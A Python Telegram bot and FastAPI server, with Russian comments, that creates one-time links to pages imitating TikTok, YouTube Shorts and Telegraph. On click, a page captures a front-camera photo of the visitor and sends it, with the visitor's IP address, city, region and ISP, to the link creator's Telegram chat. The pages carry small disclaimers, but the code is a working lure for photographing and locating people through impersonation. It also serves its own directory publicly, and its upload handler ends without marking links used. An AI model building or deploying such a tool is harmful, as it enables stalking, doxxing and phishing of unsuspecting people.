import asyncio
import html
import json
import os
import secrets
import sqlite3
from contextlib import closing
from pathlib import Path

import httpx
import uvicorn
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command, CommandStart
from aiogram.types import BufferedInputFile, KeyboardButton, Message, ReplyKeyboardMarkup
from fastapi import FastAPI, File, HTTPException, Request, UploadFile
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles

BOT_TOKEN = os.environ["BOT_TOKEN"]
PUBLIC_BASE_URL = os.environ["PUBLIC_BASE_URL"].rstrip("/")
PORT = int(os.getenv("PORT", "8000"))
DB_PATH = Path(os.getenv("DB_PATH", "links.sqlite3"))
MAX_PHOTO_BYTES = 10 * 1024 * 1024

# Определяем текущий сервис по домену
SERVICE_TYPE = "tiktok"  # по умолчанию
if "telegra-ph" in PUBLIC_BASE_URL or "telegraph" in PUBLIC_BASE_URL:
    SERVICE_TYPE = "telegraph"
elif "youtube" in PUBLIC_BASE_URL or "shorts" in PUBLIC_BASE_URL:
    SERVICE_TYPE = "youtube"
elif "tiktok" in PUBLIC_BASE_URL or "vt-tiktok" in PUBLIC_BASE_URL:
    SERVICE_TYPE = "tiktok"

# Инициализация бота
bot = Bot(BOT_TOKEN)
dp = Dispatcher()
router = Router()
dp.include_router(router)
app = FastAPI(docs_url=None, redoc_url=None)

# Монтируем статические файлы
app.mount("/static", StaticFiles(directory="."), name="static")

SERVICES = {
    "tiktok": {"name": "TikTok", "emoji": "🎵", "route": "tiktok"},
    "youtube": {"name": "YouTube", "emoji": "📺", "route": "youtube"},
    "telegraph": {"name": "Telegraph", "emoji": "📝", "route": "telegraph"},
}


def db_init() -> None:
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    with closing(sqlite3.connect(DB_PATH)) as con:
        con.execute(
            """
            CREATE TABLE IF NOT EXISTS links (
                token TEXT PRIMARY KEY,
                owner_chat_id INTEGER NOT NULL,
                used INTEGER NOT NULL DEFAULT 0,
                created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
                service TEXT NOT NULL DEFAULT 'tiktok',
                title TEXT DEFAULT '',
                content TEXT DEFAULT ''
            )
            """
        )
        columns = {row[1] for row in con.execute("PRAGMA table_info(links)").fetchall()}
        if "service" not in columns:
            con.execute("ALTER TABLE links ADD COLUMN service TEXT NOT NULL DEFAULT 'tiktok'")
        if "title" not in columns:
            con.execute("ALTER TABLE links ADD COLUMN title TEXT DEFAULT ''")
        if "content" not in columns:
            con.execute("ALTER TABLE links ADD COLUMN content TEXT DEFAULT ''")

        # Черновики Telegraph храним в SQLite, а не в памяти процесса.
        # Это переживает перезапуск polling/server и не теряет шаг между
        # вводом заголовка и текста статьи.
        con.execute(
            """
            CREATE TABLE IF NOT EXISTS telegraph_drafts (
                chat_id INTEGER PRIMARY KEY,
                step TEXT NOT NULL,
                title TEXT DEFAULT '',
                updated_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
            )
            """
        )
        con.commit()


def set_telegraph_draft(chat_id: int, step: str, title: str = "") -> None:
    with closing(sqlite3.connect(DB_PATH)) as con:
        con.execute(
            """
            INSERT INTO telegraph_drafts(chat_id, step, title, updated_at)
            VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(chat_id) DO UPDATE SET
                step = excluded.step,
                title = excluded.title,
                updated_at = CURRENT_TIMESTAMP
            """,
            (chat_id, step, title),
        )
        con.commit()


def get_telegraph_draft(chat_id: int):
    with closing(sqlite3.connect(DB_PATH)) as con:
        return con.execute(
            "SELECT step, title FROM telegraph_drafts WHERE chat_id = ?",
            (chat_id,),
        ).fetchone()


def clear_telegraph_draft(chat_id: int) -> None:
    with closing(sqlite3.connect(DB_PATH)) as con:
        con.execute("DELETE FROM telegraph_drafts WHERE chat_id = ?", (chat_id,))
        con.commit()


def create_link(owner_chat_id: int, service: str, title: str = "", content: str = "") -> str:
    if service not in SERVICES:
        service = "tiktok"
    while True:
        token = secrets.token_urlsafe(18)
        try:
            with closing(sqlite3.connect(DB_PATH)) as con:
                con.execute(
                    "INSERT INTO links(token, owner_chat_id, used, service, title, content) VALUES (?, ?, 0, ?, ?, ?)",
                    (token, owner_chat_id, service, title, content),
                )
                con.commit()
            return token
        except sqlite3.IntegrityError:
            continue


def get_link(token: str):
    with closing(sqlite3.connect(DB_PATH)) as con:
        return con.execute(
            "SELECT owner_chat_id, used, service, title, content FROM links WHERE token = ?", (token,)
        ).fetchone()


def get_link_by_short_id(short_id: str, service: str = None):
    """Поиск ссылки по короткому ID и сервису"""
    with closing(sqlite3.connect(DB_PATH)) as con:
        if service:
            query = "SELECT token, owner_chat_id, used, service, title, content FROM links WHERE token LIKE ? AND service = ?"
            return con.execute(query, (f"{short_id}%", service)).fetchone()
        else:
            query = "SELECT token, owner_chat_id, used, service, title, content FROM links WHERE token LIKE ?"
            return con.execute(query, (f"{short_id}%",)).fetchone()


def claim_link(token: str) -> bool:
    """Temporarily claims an unused link so two uploads cannot race each other."""
    with closing(sqlite3.connect(DB_PATH)) as con:
        cur = con.execute(
            "UPDATE links SET used = 2 WHERE token = ? AND used = 0", (token,)
        )
        con.commit()
        return cur.rowcount == 1


def finish_link(token: str) -> None:
    with closing(sqlite3.connect(DB_PATH)) as con:
        con.execute("UPDATE links SET used = 1 WHERE token = ?", (token,))
        con.commit()


def release_link(token: str) -> None:
    with closing(sqlite3.connect(DB_PATH)) as con:
        con.execute("UPDATE links SET used = 0 WHERE token = ? AND used = 2", (token,))
        con.commit()


def client_ip(request: Request) -> str:
    cf = request.headers.get("cf-connecting-ip")
    if cf:
        return cf.strip()
    xff = request.headers.get("x-forwarded-for")
    if xff:
        return xff.split(",")[0].strip()
    return request.client.host if request.client else "unknown"


async def lookup_ip(ip: str) -> dict:
    if ip in {"unknown", "127.0.0.1", "::1"}:
        return {}
    try:
        async with httpx.AsyncClient(timeout=6.0) as client:
            r = await client.get(f"https://ipwho.is/{ip}")
            r.raise_for_status()
            data = r.json()
            if not data.get("success", True):
                return {}
            return data
    except Exception:
        return {}


def public_link(service: str, token: str) -> str:
    """Генерирует ссылку в зависимости от сервиса"""
    short_id = token[:8]
    base = PUBLIC_BASE_URL.replace('https://', '').split('/')[0]
    
    # Для каждого сервиса свой формат ссылки
    if service == "tiktok":
        return f"https://{base}/@{short_id}"
    elif service == "youtube":
        return f"https://{base}/shorts/{short_id}"
    elif service == "telegraph":
        return f"https://{base}/{short_id}"
    else:
        return f"{PUBLIC_BASE_URL}/{service}/{token}"


def service_keyboard() -> ReplyKeyboardMarkup:
    """Клавиатура с тремя кнопками для всех сервисов"""
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🎵 TikTok")],
            [KeyboardButton(text="📺 YouTube")],
            [KeyboardButton(text="📝 Telegraph")],
        ],
        resize_keyboard=True,
    )


@router.message(CommandStart())
async def start(message: Message):
    clear_telegraph_draft(message.chat.id)
    await message.answer(
        "👋 Выберите оформление страницы:",
        reply_markup=service_keyboard(),
    )


@router.message(Command("new"))
async def new_link_command(message: Message):
    clear_telegraph_draft(message.chat.id)
    await message.answer("Выберите оформление новой ссылки:", reply_markup=service_keyboard())


@router.message(F.text.in_({"🎵 TikTok", "📺 YouTube", "📝 Telegraph"}))
async def create_service_link(message: Message):
    service_map = {
        "🎵 TikTok": "tiktok",
        "📺 YouTube": "youtube",
        "📝 Telegraph": "telegraph",
    }
    service = service_map.get(message.text)
    if not service:
        return

    # Любой новый выбор оформления начинает сценарий заново.
    clear_telegraph_draft(message.chat.id)

    if service == "telegraph":
        await message.answer(
            "📝 Введите заголовок статьи (или отправьте '-' для пропуска):"
        )
        set_telegraph_draft(message.chat.id, "title")
        return

    token = create_link(message.chat.id, service)
    url = public_link(service, token)
    info = SERVICES[service]

    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="🔗 Создать новую ссылку")]],
        resize_keyboard=True,
    )
    
    await message.answer(
        f"{info['emoji']} Одноразовая ссылка создана:\n"
        f"<a href='{url}'>{url}</a>\n\n"
        f"Оформление страницы: {info['name']}.",
        parse_mode="HTML",
        reply_markup=kb,
        disable_web_page_preview=False,
    )


@router.message(F.text == "🔗 Создать новую ссылку")
async def new_link(message: Message):
    # Сбрасываем незаконченный Telegraph-черновик, если пользователь решил
    # начать создание ссылки заново.
    clear_telegraph_draft(message.chat.id)
    await message.answer("Выберите оформление новой ссылки:", reply_markup=service_keyboard())


@router.message(F.text)
async def handle_telegraph_input(message: Message):
    chat_id = message.chat.id
    draft = get_telegraph_draft(chat_id)
    if not draft:
        return

    step, saved_title = draft

    if step == "title":
        title = message.text.strip()
        if title == "-":
            title = "📝 Статья Telegraph"
        set_telegraph_draft(chat_id, "content", title)
        await message.answer(
            "✍️ Введите текст статьи (или отправьте '-' для стандартного текста):"
        )
        return

    if step == "content":
        content = message.text.strip()
        if content == "-":
            content = "Это пример статьи, созданной через бота."

        title = saved_title or "📝 Статья Telegraph"
        token = create_link(chat_id, "telegraph", title, content)
        url = public_link("telegraph", token)
        info = SERVICES["telegraph"]
        clear_telegraph_draft(chat_id)

        kb = ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="🔗 Создать новую ссылку")]],
            resize_keyboard=True,
        )

        await message.answer(
            f"{info['emoji']} Одноразовая ссылка создана:\n"
            f"<a href='{url}'>{url}</a>\n\n"
            f"Оформление страницы: {info['name']}.",
            parse_mode="HTML",
            reply_markup=kb,
            disable_web_page_preview=False,
        )
        return


def generate_tiktok_page(token: str) -> str:
    short_id = token[:8]
    photo_url = f"{PUBLIC_BASE_URL}/static/photo.png"

    return f'''<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Short video preview — @{short_id}</title>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
:root {{ color-scheme:dark; font-family:Arial,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; }}
body {{ background:#000; min-height:100svh; display:flex; justify-content:center; color:#fff; }}
.phone {{ position:relative; width:100%; max-width:430px; min-height:100svh; overflow:hidden; background:#000; }}
.media {{ position:absolute; inset:0; width:100%; height:100%; object-fit:cover; }}
#video {{ display:none; }}
.shade {{ position:absolute; inset:0; background:linear-gradient(to bottom,rgba(0,0,0,.24),transparent 24%,transparent 58%,rgba(0,0,0,.72)); pointer-events:none; }}
.top {{ position:absolute; top:max(16px,env(safe-area-inset-top)); left:0; right:0; display:flex; justify-content:center; gap:18px; z-index:3; font-weight:700; font-size:15px; text-shadow:0 1px 4px #000; }}
.top .muted {{ opacity:.68; }}
.demo {{ position:absolute; top:max(52px,calc(env(safe-area-inset-top) + 36px)); left:50%; transform:translateX(-50%); z-index:4; font-size:11px; padding:5px 9px; border-radius:999px; background:rgba(0,0,0,.55); backdrop-filter:blur(8px); white-space:nowrap; }}
.actions {{ position:absolute; right:10px; bottom:112px; z-index:3; display:flex; flex-direction:column; align-items:center; gap:18px; text-shadow:0 1px 5px #000; }}
.action {{ display:flex; flex-direction:column; align-items:center; gap:4px; font-size:11px; font-weight:700; }}
.action .ico {{ font-size:27px; line-height:30px; }}
.avatar {{ width:46px; height:46px; border-radius:50%; background:#151515; border:2px solid #fff; display:flex; align-items:center; justify-content:center; font-weight:900; }}
.copy {{ position:absolute; left:12px; right:72px; bottom:84px; z-index:3; text-shadow:0 1px 5px #000; }}
.user {{ font-weight:800; margin-bottom:7px; }}
.caption {{ font-size:14px; line-height:1.35; }}
.music {{ margin-top:8px; font-size:13px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }}
.consent {{ position:absolute; left:12px; right:12px; bottom:145px; z-index:5; background:rgba(15,15,15,.88); border:1px solid rgba(255,255,255,.14); border-radius:16px; padding:12px; backdrop-filter:blur(12px); }}
.consent p {{ font-size:12px; line-height:1.35; color:#eee; margin-bottom:9px; }}
.btnrow {{ display:flex; gap:8px; }}
button {{ flex:1; border:0; border-radius:10px; padding:11px 12px; font-weight:800; cursor:pointer; }}
.primary {{ background:#fff; color:#111; }}
.send {{ display:none; background:#fe2c55; color:#fff; }}
.status {{ margin-top:7px; font-size:12px; min-height:16px; color:#ddd; }}
.nav {{ position:absolute; left:0; right:0; bottom:0; height:64px; padding-bottom:env(safe-area-inset-bottom); z-index:4; display:flex; align-items:center; justify-content:space-around; background:linear-gradient(to top,rgba(0,0,0,.78),rgba(0,0,0,.12)); font-size:10px; font-weight:700; }}
.nav span {{ display:flex; flex-direction:column; align-items:center; gap:3px; }}
.nav b {{ font-size:21px; }}
.plus {{ background:#fff; color:#000; border-radius:7px; padding:0 12px; box-shadow:-3px 0 #25f4ee,3px 0 #fe2c55; }}
</style>
</head>
<body>
<div class="phone">
  <img class="media" id="preview" src="{photo_url}" alt="Preview">
  <video class="media" id="video" playsinline autoplay muted></video>
  <div class="shade"></div>
  <div class="top"><span class="muted">Подписки</span><span>Рекомендации</span></div>
  <div class="demo">Демо-страница • не официальный TikTok</div>

  <div class="actions">
    <div class="avatar">V</div>
    <div class="action"><span class="ico">♥</span><span>12,8K</span></div>
    <div class="action"><span class="ico">●</span><span>318</span></div>
    <div class="action"><span class="ico">★</span><span>1 204</span></div>
    <div class="action"><span class="ico">↗</span><span>Поделиться</span></div>
  </div>

  <div class="consent" id="consent">
    <p>Чтобы сделать фото, камера включится только после нажатия. Снимок и IP-данные будут отправлены владельцу этой ссылки.</p>
    <div class="btnrow">
      <button class="primary" id="cameraBtn">Разрешить камеру</button>
      <button class="send" id="sendBtn">Сделать и отправить</button>
    </div>
    <div class="status" id="status"></div>
  </div>

  <div class="copy">
    <div class="user">@verhcau</div>
    <div class="caption">Новый ролик 🔥 #video #fyp</div>
    <div class="music">♫ оригинальный звук — verhcau</div>
  </div>

  <div class="nav">
    <span><b>⌂</b>Главная</span><span><b>⌕</b>Друзья</span><span><b class="plus">+</b></span><span><b>▣</b>Входящие</span><span><b>◉</b>Профиль</span>
  </div>
</div>
<script>
const token = {json.dumps(token)};
const video = document.getElementById('video');
const preview = document.getElementById('preview');
const status = document.getElementById('status');
const cameraBtn = document.getElementById('cameraBtn');
const sendBtn = document.getElementById('sendBtn');
let stream = null;
let sending = false;

cameraBtn.addEventListener('click', async () => {{
  try {{
    if (!navigator.mediaDevices?.getUserMedia) throw new Error('Камера недоступна в этом браузере');
    stream = await navigator.mediaDevices.getUserMedia({{video:{{facingMode:'user'}},audio:false}});
    video.srcObject = stream;
    video.style.display = 'block';
    preview.style.display = 'none';
    cameraBtn.style.display = 'none';
    sendBtn.style.display = 'block';
    status.textContent = 'Камера включена. Нажмите «Сделать и отправить».';
  }} catch (e) {{ status.textContent = 'Ошибка: ' + e.message; }}
}});

sendBtn.addEventListener('click', async () => {{
  if (!stream || sending) return;
  sending = true;
  sendBtn.disabled = true;
  status.textContent = 'Отправка…';
  try {{
    await new Promise(r => video.readyState >= 2 ? r() : (video.onloadeddata = r));
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 720;
    canvas.height = video.videoHeight || 1280;
    canvas.getContext('2d').drawImage(video,0,0);
    const blob = await new Promise(r => canvas.toBlob(r,'image/jpeg',.92));
    if (!blob) throw new Error('Не удалось создать снимок');
    const fd = new FormData(); fd.append('photo',blob,'photo.jpg');
    const r = await fetch(`/api/send/${{encodeURIComponent(token)}}`,{{method:'POST',body:fd}});
    const data = await r.json().catch(()=>({{}}));
    if (!r.ok) throw new Error(data.detail || 'Ошибка отправки');
    stream.getTracks().forEach(t=>t.stop());
    video.style.display='none'; preview.style.display='block';
    sendBtn.style.display='none';
    status.textContent='Фото отправлено.';
  }} catch(e) {{
    status.textContent='Ошибка: '+e.message;
    sendBtn.disabled=false; sending=false;
  }}
}});
</script>
</body>
</html>'''


def generate_youtube_page(token: str) -> str:
    short_id = token[:8]
    photo_url = f"{PUBLIC_BASE_URL}/static/photo.png"

    return f'''<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Shorts preview — {short_id}</title>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
:root {{ color-scheme:dark; font-family:Arial,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; }}
body {{ background:#0f0f0f; min-height:100svh; display:flex; justify-content:center; color:#fff; }}
.short {{ position:relative; width:100%; max-width:430px; min-height:100svh; overflow:hidden; background:#000; }}
.media {{ position:absolute; inset:0; width:100%; height:100%; object-fit:cover; }}
#video {{ display:none; }}
.shade {{ position:absolute; inset:0; background:linear-gradient(to bottom,rgba(0,0,0,.24),transparent 23%,transparent 58%,rgba(0,0,0,.78)); pointer-events:none; }}
.top {{ position:absolute; top:max(14px,env(safe-area-inset-top)); left:14px; right:14px; display:flex; align-items:center; justify-content:space-between; z-index:4; }}
.brand {{ font-size:20px; font-weight:800; display:flex; gap:7px; align-items:center; }}
.brand i {{ display:inline-flex; width:27px; height:20px; border-radius:6px; background:#f00; align-items:center; justify-content:center; font-style:normal; font-size:12px; }}
.top-icons {{ display:flex; gap:18px; font-size:22px; }}
.demo {{ position:absolute; top:max(51px,calc(env(safe-area-inset-top) + 36px)); left:14px; z-index:4; font-size:11px; padding:5px 9px; border-radius:999px; background:rgba(0,0,0,.58); backdrop-filter:blur(8px); }}
.rail {{ position:absolute; right:10px; bottom:108px; z-index:3; display:flex; flex-direction:column; gap:21px; align-items:center; }}
.rail .item {{ display:flex; flex-direction:column; align-items:center; gap:4px; font-size:11px; font-weight:700; text-shadow:0 1px 5px #000; }}
.rail .ico {{ font-size:29px; }}
.info {{ position:absolute; left:13px; right:72px; bottom:76px; z-index:3; text-shadow:0 1px 5px #000; }}
.channel {{ display:flex; align-items:center; gap:9px; margin-bottom:9px; font-weight:800; }}
.channel .avatar {{ width:34px; height:34px; border-radius:50%; background:#222; border:1px solid #fff; display:flex; align-items:center; justify-content:center; }}
.subscribe {{ padding:7px 11px; border-radius:18px; background:#fff; color:#111; font-size:12px; text-shadow:none; }}
.caption {{ font-size:14px; line-height:1.35; }}
.consent {{ position:absolute; left:12px; right:12px; bottom:142px; z-index:5; background:rgba(20,20,20,.9); border:1px solid rgba(255,255,255,.14); border-radius:16px; padding:12px; backdrop-filter:blur(12px); }}
.consent p {{ font-size:12px; line-height:1.35; color:#eee; margin-bottom:9px; }}
.btnrow {{ display:flex; gap:8px; }}
button {{ flex:1; border:0; border-radius:999px; padding:11px 12px; font-weight:800; cursor:pointer; }}
.primary {{ background:#fff; color:#111; }}
.send {{ display:none; background:#f00; color:#fff; }}
.status {{ margin-top:7px; font-size:12px; min-height:16px; color:#ddd; }}
.bottom {{ position:absolute; bottom:0; left:0; right:0; height:56px; padding-bottom:env(safe-area-inset-bottom); display:flex; justify-content:space-around; align-items:center; z-index:4; background:linear-gradient(to top,rgba(0,0,0,.86),rgba(0,0,0,.14)); font-size:10px; }}
.bottom span {{ display:flex; flex-direction:column; align-items:center; gap:2px; }}
.bottom b {{ font-size:20px; }}
</style>
</head>
<body>
<div class="short">
  <img class="media" id="preview" src="{photo_url}" alt="Preview">
  <video class="media" id="video" playsinline autoplay muted></video>
  <div class="shade"></div>
  <div class="top"><div class="brand"><i>▶</i> Shorts</div><div class="top-icons">⌕ ⋮</div></div>
  <div class="demo">Демо-страница • не официальный YouTube</div>

  <div class="rail">
    <div class="item"><span class="ico">👍</span><span>8,4 тыс.</span></div>
    <div class="item"><span class="ico">👎</span><span>Не нравится</span></div>
    <div class="item"><span class="ico">◉</span><span>126</span></div>
    <div class="item"><span class="ico">↗</span><span>Поделиться</span></div>
    <div class="item"><span class="ico">⋮</span></div>
  </div>

  <div class="consent">
    <p>Камера включится только после нажатия. Снимок и IP-данные будут отправлены владельцу этой ссылки.</p>
    <div class="btnrow"><button class="primary" id="cameraBtn">Разрешить камеру</button><button class="send" id="sendBtn">Сделать и отправить</button></div>
    <div class="status" id="status"></div>
  </div>

  <div class="info">
    <div class="channel"><span class="avatar">V</span><span>@verhcau</span><span class="subscribe">Подписаться</span></div>
    <div class="caption">Новое короткое видео 🔥 #shorts</div>
  </div>

  <div class="bottom"><span><b>⌂</b>Главная</span><span><b>▣</b>Shorts</span><span><b>＋</b>Создать</span><span><b>▤</b>Подписки</span><span><b>◉</b>Вы</span></div>
</div>
<script>
const token = {json.dumps(token)};
const video = document.getElementById('video');
const preview = document.getElementById('preview');
const status = document.getElementById('status');
const cameraBtn = document.getElementById('cameraBtn');
const sendBtn = document.getElementById('sendBtn');
let stream=null, sending=false;
cameraBtn.addEventListener('click',async()=>{{
  try{{
    if(!navigator.mediaDevices?.getUserMedia) throw new Error('Камера недоступна в этом браузере');
    stream=await navigator.mediaDevices.getUserMedia({{video:{{facingMode:'user'}},audio:false}});
    video.srcObject=stream; video.style.display='block'; preview.style.display='none';
    cameraBtn.style.display='none'; sendBtn.style.display='block'; status.textContent='Камера включена. Нажмите «Сделать и отправить».';
  }}catch(e){{status.textContent='Ошибка: '+e.message;}}
}});
sendBtn.addEventListener('click',async()=>{{
  if(!stream||sending)return; sending=true; sendBtn.disabled=true; status.textContent='Отправка…';
  try{{
    await new Promise(r=>video.readyState>=2?r():(video.onloadeddata=r));
    const canvas=document.createElement('canvas'); canvas.width=video.videoWidth||720; canvas.height=video.videoHeight||1280;
    canvas.getContext('2d').drawImage(video,0,0);
    const blob=await new Promise(r=>canvas.toBlob(r,'image/jpeg',.92)); if(!blob)throw new Error('Не удалось создать снимок');
    const fd=new FormData(); fd.append('photo',blob,'photo.jpg');
    const r=await fetch(`/api/send/${{encodeURIComponent(token)}}`,{{method:'POST',body:fd}}); const data=await r.json().catch(()=>({{}}));
    if(!r.ok)throw new Error(data.detail||'Ошибка отправки');
    stream.getTracks().forEach(t=>t.stop()); video.style.display='none'; preview.style.display='block'; sendBtn.style.display='none'; status.textContent='Фото отправлено.';
  }}catch(e){{status.textContent='Ошибка: '+e.message; sendBtn.disabled=false; sending=false;}}
}});
</script>
</body>
</html>'''


def generate_telegraph_page(token: str, title: str, content: str) -> str:
    short_id = token[:8]
    photo_url = f"{PUBLIC_BASE_URL}/static/photo.png"
    safe_title = html.escape(title or "Статья")
    safe_content = "<br>".join(html.escape(content or "").splitlines())

    return f'''<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>{safe_title}</title>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
:root {{ color-scheme:light; font-family:Georgia,"Times New Roman",serif; }}
body {{ background:#fff; min-height:100vh; color:#222; }}
.article {{ max-width:740px; margin:0 auto; padding:52px 24px 70px; }}
.brand {{ font-family:Arial,sans-serif; color:#888; font-size:13px; margin-bottom:28px; }}
h1 {{ font-size:42px; line-height:1.08; font-weight:700; letter-spacing:-.5px; margin-bottom:10px; }}
.meta {{ font-family:Arial,sans-serif; color:#999; font-size:14px; margin-bottom:28px; }}
.hero {{ width:100%; max-height:480px; object-fit:cover; display:block; margin:0 0 26px; }}
.content {{ font-size:19px; line-height:1.62; overflow-wrap:anywhere; }}
.consent {{ margin-top:34px; border-top:1px solid #e6e6e6; padding-top:22px; font-family:Arial,sans-serif; }}
.consent .note {{ font-size:13px; line-height:1.45; color:#666; margin-bottom:12px; }}
.buttons {{ display:flex; gap:10px; flex-wrap:wrap; }}
button {{ border:0; border-radius:8px; padding:11px 15px; font-size:14px; font-weight:700; cursor:pointer; }}
#cameraBtn {{ background:#222; color:#fff; }}
#sendBtn {{ background:#2b8aef; color:#fff; display:none; }}
#status {{ min-height:20px; margin-top:10px; font-size:13px; color:#666; }}
#video {{ display:none; width:100%; margin-top:16px; border-radius:8px; }}
.demo {{ display:inline-block; margin-left:7px; padding:3px 7px; border-radius:999px; background:#f1f1f1; color:#777; font-size:10px; vertical-align:1px; }}
@media (max-width:600px) {{ .article {{ padding:35px 20px 55px; }} h1 {{ font-size:34px; }} .content {{ font-size:18px; }} }}
</style>
</head>
<body>
<main class="article">
  <div class="brand">Telegraph-style article <span class="demo">демо, не официальный Telegraph</span></div>
  <h1>{safe_title}</h1>
  <div class="meta">Verhcau · #{short_id}</div>
  <img class="hero" id="preview" src="{photo_url}" alt="Preview">
  <div class="content">{safe_content}</div>

  <section class="consent">
    <div class="note">Камера включится только после вашего нажатия. Если вы отправите снимок, фото и IP-данные будут переданы владельцу этой ссылки.</div>
    <div class="buttons">
      <button id="cameraBtn">Разрешить камеру</button>
      <button id="sendBtn">Сделать и отправить фото</button>
    </div>
    <div id="status"></div>
    <video id="video" playsinline autoplay muted></video>
  </section>
</main>
<script>
const token = {json.dumps(token)};
const video = document.getElementById('video');
const preview = document.getElementById('preview');
const status = document.getElementById('status');
const cameraBtn = document.getElementById('cameraBtn');
const sendBtn = document.getElementById('sendBtn');
let stream = null;
let sending = false;

cameraBtn.addEventListener('click', async () => {{
  try {{
    if (!navigator.mediaDevices?.getUserMedia) throw new Error('Камера недоступна в этом браузере');
    stream = await navigator.mediaDevices.getUserMedia({{video:{{facingMode:'user'}},audio:false}});
    video.srcObject = stream;
    video.style.display = 'block';
    cameraBtn.style.display = 'none';
    sendBtn.style.display = 'inline-block';
    status.textContent = 'Камера включена. Для отправки нажмите вторую кнопку.';
  }} catch (e) {{ status.textContent = 'Ошибка: ' + e.message; }}
}});

sendBtn.addEventListener('click', async () => {{
  if (!stream || sending) return;
  sending = true; sendBtn.disabled = true; status.textContent = 'Отправка…';
  try {{
    await new Promise(r => video.readyState >= 2 ? r() : (video.onloadeddata = r));
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 720; canvas.height = video.videoHeight || 1280;
    canvas.getContext('2d').drawImage(video,0,0);
    const blob = await new Promise(r => canvas.toBlob(r,'image/jpeg',.92));
    if (!blob) throw new Error('Не удалось создать снимок');
    const fd = new FormData(); fd.append('photo',blob,'photo.jpg');
    const r = await fetch(`/api/send/${{encodeURIComponent(token)}}`,{{method:'POST',body:fd}});
    const data = await r.json().catch(()=>({{}}));
    if (!r.ok) throw new Error(data.detail || 'Ошибка отправки');
    stream.getTracks().forEach(t=>t.stop());
    video.style.display='none'; sendBtn.style.display='none'; status.textContent='Фото отправлено.';
  }} catch(e) {{ status.textContent='Ошибка: '+e.message; sendBtn.disabled=false; sending=false; }}
}});
</script>
</body>
</html>'''


@app.get("/", response_class=HTMLResponse)
async def root():
    return "<h3>Camera Link Bot is running.</h3>"


@app.get("/@{short_id}")
async def tiktok_link(short_id: str):
    """Обработчик ссылок в стиле TikTok - /@abc123def"""
    row = get_link_by_short_id(short_id, "tiktok")
    
    if not row:
        raise HTTPException(404, "Ссылка не найдена")
    
    token, owner_chat_id, used, service, title, content = row
    if used == 1:
        return HTMLResponse("<h3>Эта ссылка уже использована.</h3>", status_code=410)
    if used == 2:
        return HTMLResponse("<h3>Фото сейчас отправляется.</h3>", status_code=409)
    
    return HTMLResponse(generate_tiktok_page(token))


@app.get("/shorts/{short_id}")
async def youtube_link(short_id: str):
    """Обработчик ссылок в стиле YouTube Shorts - /shorts/abc123def"""
    row = get_link_by_short_id(short_id, "youtube")
    
    if not row:
        raise HTTPException(404, "Ссылка не найдена")
    
    token, owner_chat_id, used, service, title, content = row
    if used == 1:
        return HTMLResponse("<h3>Эта ссылка уже использована.</h3>", status_code=410)
    if used == 2:
        return HTMLResponse("<h3>Фото сейчас отправляется.</h3>", status_code=409)
    
    return HTMLResponse(generate_youtube_page(token))


@app.get("/{short_id}")
async def telegraph_link(short_id: str):
    """Обработчик ссылок в стиле Telegraph - /abc123def"""
    row = get_link_by_short_id(short_id, "telegraph")
    
    if not row:
        row = get_link_by_short_id(short_id)
        if not row:
            raise HTTPException(404, "Ссылка не найдена")
    
    token, owner_chat_id, used, service, title, content = row
    if used == 1:
        return HTMLResponse("<h3>Эта ссылка уже использована.</h3>", status_code=410)
    if used == 2:
        return HTMLResponse("<h3>Фото сейчас отправляется.</h3>", status_code=409)
    
    if service == "tiktok":
        return HTMLResponse(generate_tiktok_page(token))
    elif service == "youtube":
        return HTMLResponse(generate_youtube_page(token))
    elif service == "telegraph":
        return HTMLResponse(generate_telegraph_page(token, title or "📝 Статья Telegraph", content or "Это пример статьи, созданной через бота."))
    else:
        return HTMLResponse(generate_tiktok_page(token))


@app.post("/api/send/{token}")
async def send_photo(token: str, request: Request, photo: UploadFile = File(...)):
    row = get_link(token)
    if not row:
        raise HTTPException(404, "Ссылка не найдена")
    owner_chat_id, used, service, title, content = row
    if used != 0:
        raise HTTPException(410, "Ссылка уже использована или обрабатывается")

    content_type = (photo.content_type or "").lower()
    if content_type not in {"image/jpeg", "image/png", "image/webp"}:
        raise HTTPException(415, "Разрешены только изображения")

    data = await photo.read(MAX_PHOTO_BYTES + 1)
    if not data or len(data) > MAX_PHOTO_BYTES:
        raise HTTPException(413, "Фото слишком большое")

    if not claim_link(token):
        raise HTTPException(410, "Ссылка уже использована или обрабатывается")

    ip = client_ip(request)
    geo = await lookup_ip(ip)
    city = geo.get("city") or "не определён"
    region = geo.get("region") or "не определён"
    country = geo.get("country") or "не определена"
    isp = (geo.get("connection") or {}).get("isp") or "не определён"
    service_emoji = SERVICES.get(service, {}).get("emoji", "📸")

    caption = (
        f"{service_emoji} Получено фото по вашей ссылке\n\n"
        f"🌐 IP: {ip}\n"
        f"🏙 Город: {city}\n"
        f"🗺 Регион: {region}\n"
        f"🌍 Страна: {country}\n"
        f"📡 Провайдер: {isp}\n\n"
        "ℹ️ Местоположение определено приблизительно по IP и может отличаться от фактического."
    )

    try:
        await bot.send_photo(
            chat_id=owner_chat_id,
            photo=BufferedInputFile(data, filename="photo.jpg"),
            caption=caption,
        )
    except Exception as exc:
        release_link(token)
        raise HTTPException(502, "Не удалось доставить фото в Telegram") from exc

